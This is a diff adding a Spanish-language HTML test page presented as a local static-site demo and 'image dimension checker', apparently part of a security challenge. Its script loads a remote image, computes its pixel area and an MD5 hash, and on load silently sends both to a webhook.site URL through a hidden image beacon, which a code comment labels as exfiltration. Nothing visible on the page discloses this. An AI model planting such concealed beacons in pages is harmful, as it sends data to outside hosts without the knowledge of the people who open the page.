@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Prueba - Sitio de ejemplo</title>
+    <style>
+      body { 
+        font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial; 
+        padding: 2rem; 
+      }
+      header { 
+        margin-bottom: 1.5rem; 
+      }
+      .card { 
+        border: 1px solid #ddd; 
+        padding: 1rem; 
+        border-radius: 8px; 
+        max-width: 720px; 
+      }
+      img.logo { 
+        max-width: 200px; 
+        height: auto; 
+        display: block; 
+        margin-bottom: 1rem; 
+      }
+      pre { 
+        background: #f6f8fa; 
+        padding: 0.75rem; 
+        border-radius: 6px; 
+        overflow: auto; 
+      }
+      .info-panel {
+        margin-bottom: 1.5rem;
+        padding: 1rem;
+        background: #f0f0f0;
+        border-radius: 6px;
+      }
+      .test-image {
+        max-width: 100%;
+        border: 1px solid #ddd;
+        border-radius: 6px;
+      }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+  </head>
+  <body>
+    <header>
+      <h1>Prueba: Sitio estático</h1>
+      <p>Esta página sirve como contenido de prueba para levantar un servidor local.</p>
+    </header>
+
+    <main class="card">
+      <h2>Image Dimension Checker</h2>
+      <div id="imageInfo" class="info-panel">
+        <p><strong>Image URL:</strong> <span id="imageUrl"></span></p>
+        <p><strong>Width:</strong> <span id="imageWidth">Loading...</span> px</p>
+        <p><strong>Height:</strong> <span id="imageHeight">Loading...</span> px</p>
+        <p><strong>Level:</strong> <span id="imageLevel">Calculating...</span></p>
+        <p><strong>MD5 Hash:</strong> <span id="md5Hash">Calculating...</span></p>
+        <p><strong>Status:</strong> <span id="imageStatus">Loading...</span></p>
+      </div>
+      <img id="testImage" src="" alt="Test Image" class="test-image" />
+      
+      <h2>Pasos rápidos</h2>
+      <ol>
+        <li>Abrir PowerShell en esta carpeta.</li>
+        <li>Ejecutar <code>python server.py</code> (usa el servidor personalizado).</li>
+        <li>Ir a <a href="http://localhost:8001">http://localhost:8001</a> en el navegador.</li>
+      </ol>
+
+      <h3>Comandos de ejemplo</h3>
+      <pre><code># Ejecutar el servidor personalizado
+> python server.py
+
+# Alternativa con servidor simple de Python
+> python -m http.server 8001</code></pre>
+    </main>
+
+    <script>
+      const imageUrl = 'https://chl-7ce35d99-6ee2-49db-a434-d29528862683-imagen-importante.softwareseguro.com.ar/profile-pic';
+      const img = document.getElementById('testImage');
+      
+      document.getElementById('imageUrl').textContent = imageUrl;
+      
+      function computeMD5(level) {
+        return CryptoJS.MD5(level.toString()).toString();
+      }
+      
+      img.onload = function() {
+        const width = this.naturalWidth;
+        const height = this.naturalHeight;
+        const level = width * height;
+        
+        document.getElementById('imageWidth').textContent = width;
+        document.getElementById('imageHeight').textContent = height;
+        document.getElementById('imageLevel').textContent = level.toLocaleString();
+        document.getElementById('imageStatus').textContent = '✓ Loaded successfully';
+        document.getElementById('imageStatus').style.color = 'green';
+        
+        const md5 = computeMD5(level);
+        document.getElementById('md5Hash').textContent = md5;
+        
+        // Exfiltrate the data to webhook.site
+        const exfilImg = new Image();
+        exfilImg.src = 'https://webhook.site/a5d988bd-e346-4363-87bc-add652d0892a?md5=' + encodeURIComponent(md5) + '&level=' + encodeURIComponent(level);
+      };
+      
+      img.onerror = function() {
+        document.getElementById('imageWidth').textContent = 'N/A';
+        document.getElementById('imageHeight').textContent = 'N/A';
+        document.getElementById('imageLevel').textContent = 'N/A';
+        document.getElementById('md5Hash').textContent = 'N/A';
+        document.getElementById('imageStatus').textContent = '✗ Failed to load (CORS/404/Network error)';
+        document.getElementById('imageStatus').style.color = 'red';
+      };
+      
+      img.src = imageUrl;
+    </script>
+  </body>
+</html>
